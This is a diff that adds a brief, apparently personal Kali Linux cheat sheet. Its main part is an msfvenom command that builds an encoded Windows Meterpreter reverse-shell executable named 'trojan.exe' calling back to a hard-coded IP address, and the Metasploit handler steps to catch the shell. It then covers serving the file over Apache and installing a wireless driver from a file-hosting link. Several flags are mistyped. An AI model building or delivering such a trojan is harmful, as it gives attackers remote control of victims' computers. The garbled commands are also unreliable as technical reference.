@@ -1,0 +1,40 @@
+                        🎩DIC HOW TO 🎩
+
+
+
+1-msf6 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=37.42.96.4 LPORT=5555 .f exe .e x86/shikata_ga_nai -i 10 > trojan.exe
+-2 AFTER HE ENTER TYPE (USE multi/handler)
+3- set payload windows/meterpreter/reverse_tcp 
+4-set LHOST 
+5- set LPORT 5555
+6-exploit
+
+HOW TO TRANSFER FILES FROM KALI TO DESKTOP
+###############################
+
+1- apt - install open - vm - tools-desktop fuse 
+2-reboot
+Or 
+1- Service apache2 start 
+2- 100.100.10.1/NAME.exe/apk/py
+
+###############################
+                   (WLANE PROBLEM)
+                   ---------------------
+
+compat-wireless-2010-06-26-p.tar.bz2
+
+
+http://www.mediafire.com/file/07uoj35epx8jm02/compat-wireless-
+
+0-UNZIP AFTER DOWNLOAD
+
+1- cd compat-wireless-2010-06-26-p
+
+2-make unload
+
+3-make load
+
+4-clear
+
+5- iwconfig
